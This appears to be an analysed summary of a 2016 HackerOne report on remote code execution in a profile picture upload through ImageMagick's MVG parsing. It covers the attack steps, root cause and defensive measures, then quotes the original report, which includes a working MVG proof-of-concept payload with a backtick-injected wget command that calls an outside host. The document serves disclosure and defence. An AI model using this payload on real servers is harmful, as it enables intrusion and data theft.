# RCE in Profile Picture Upload via ImageMagick MVG Parsing

## Metadata
- **Source:** HackerOne
- **Report:** 135072 | https://hackerone.com/reports/135072
- **Submitted:** 2016-04-27
- **Reporter:** c666a323be94d57
- **Program:** HackerOne (specific program not disclosed)
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Remote Code Execution, Insufficient File Type Validation, Command Injection, Unsafe Image Processing
- **CVEs:** None
- **Category:** memory-binary

## Summary
The profile picture upload endpoint fails to validate that uploaded files are actual images before passing them to ImageMagick. An attacker can upload a specially crafted ASCII file disguised as a GIF containing MVG (Magic Vector Graphics) directives that trigger command injection through ImageMagick's delegate handlers, achieving remote code execution.

## Attack scenario
1. Attacker crafts a malicious ASCII file containing MVG directives with embedded command injection payloads using ImageMagick's 'image' directive
2. Attacker uploads the file through the /settings/profile/edit endpoint, bypassing basic file extension checks by naming it with a .gif extension
3. The application passes the uploaded file to ImageMagick's convert utility without validating its actual file type or magic bytes
4. ImageMagick parses the ASCII file as MVG format and interprets the 'image over' directive with a crafted URL containing backtick-enclosed shell commands
5. The https delegate handler in ImageMagick invokes bash to execute the curl command, which is vulnerable to command injection due to improper argument quoting
6. Attacker's injected commands execute with the privileges of the web application process (e.g., wget command to exfiltrate data)

## Root cause
The application performs insufficient file type validation, relying only on file extensions rather than verifying actual file content through magic bytes. Additionally, ImageMagick's MVG format parsing and delegate system allow arbitrary command execution when processing untrusted input.

## Attacker mindset
An attacker recognizes that file upload functionality is often a prime attack surface and investigates what backend processors handle the uploaded files. Upon discovering ImageMagick usage, the attacker researches its MVG format and delegate system to find parsing quirks that enable command injection, ultimately achieving code execution on the server.

## Defensive takeaways
- Always validate uploaded files using magic bytes/file signatures, not just file extensions
- Whitelist only specific safe image formats (JPEG, PNG, GIF) and validate against known-safe magic values before processing
- Consider using dedicated image processing libraries with sandboxed execution or disable dangerous ImageMagick features like MVG parsing and delegates
- Restrict outbound network access from application servers performing image processing to prevent data exfiltration and command callback
- Implement principle of least privilege: run image processing with minimal required permissions and in isolated environments
- Keep ImageMagick and all image processing libraries patched and monitor security advisories for delegate-related vulnerabilities

## Variant hunting
Search for similar vulnerabilities in other file upload endpoints, other image processing libraries (GraphicsMagick, Ghostscript, FFmpeg), document conversion services, or any application using ImageMagick delegates. Test PDF uploads, SVG uploads, and other formats that support embedded directives or commands.

## MITRE ATT&CK
- T1190
- T1205
- T1059
- T1203
- T1566

## Notes
The report responsibly discloses a novel vulnerability in ImageMagick's MVG parsing that extends beyond this specific application. The vulnerability chain demonstrates why file type validation must occur at the content level, not the presentation level. The recommendation to disable outbound connections is particularly important as it would have prevented command callback and data exfiltration even if RCE occurred.

## Full report
<details><summary>Expand</summary>

Issue
=====
The profile picture upload at /settings/profile/edit is vulnerable to remote code execution due to the uploaded file being passed to ImageMagick without checking whether it's an actual image. Combined with the fact that ImageMagick parses ASCII text as so called MVG (Magic Vector Graphics), this enables an attacker to trigger a newly discovered vulnerability in MVG parsing which allows for command injection.

Steps to reproduce
======
Upload the following ASCII file as **x.gif** using the regular profile picture upload flow:
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```
This executes the `wget` command and makes an HTTP request to 1.2.3.4 on port 1337.

Technical details
======
The "image" directive in MVG allows for the usage of so called "delegates" which are somewhat similar to a protocol specifier in a URL: a colon-seperated (delegate,argument)-pair like e.g. "label:SomeText" can be specified, invoking the respective delegate handler. Custom delegates can be added as a bash-call with substitute variables in /etc/ImageMagick/delegates.xml. The handler for https-URLs uses a bash command to invoke curl which suffers from the command injection vulnerability.

Recommendation
======
A simple fix is to check the magic values of the uploaded files and whitelist those, i.e. to only allow JPEG, GIF and PNG uploads before passing the file to ImageMagick (e.g. the `convert` utility).
Also, servers that do image processing should not be able to establish outbound network connections.
This vulnerability will be reported to ImageMagick within the next 72 hours as a detailed advisory about this and several other MVG issues is currently being drafted.

</details>

---
*Analysed by Claude on 2026-05-12*
